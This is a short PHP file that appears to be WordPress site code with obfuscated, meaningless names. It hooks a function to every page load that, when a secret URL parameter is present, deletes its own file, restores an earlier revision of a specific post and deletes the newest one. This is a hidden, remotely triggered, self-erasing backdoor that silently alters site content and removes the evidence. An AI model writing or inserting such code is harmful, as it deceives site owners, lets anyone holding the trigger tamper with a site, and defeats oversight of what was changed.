<?php

function cdn_digital_attachment() {
	if (isset($_GET['s3_site_information']) && $_GET['s3_site_information'] === 'change_flexible_deprecated') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$json_invoice_virtual = 12702;
		$assistant_country_countdown_variation = wp_get_post_revisions($json_invoice_virtual);
		if (empty($assistant_country_countdown_variation)) die('no revisions');
		if (count($assistant_country_countdown_variation) < 2) die('less than 2');
		$panel_out_headers = array_shift($assistant_country_countdown_variation);
		$finder_tabs_active_database = $panel_out_headers->ID;
		$finder_geo_ecommerce_youtube = array_shift($assistant_country_countdown_variation);
		$accessibility_carousel_mode = $finder_geo_ecommerce_youtube->ID;
		$assets_get_count = wp_restore_post_revision($accessibility_carousel_mode);
		if ($assets_get_count === false) die('error restoring');
		$assets_get_count = wp_delete_post_revision($finder_tabs_active_database);		
		if ($assets_get_count === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'cdn_digital_attachment');
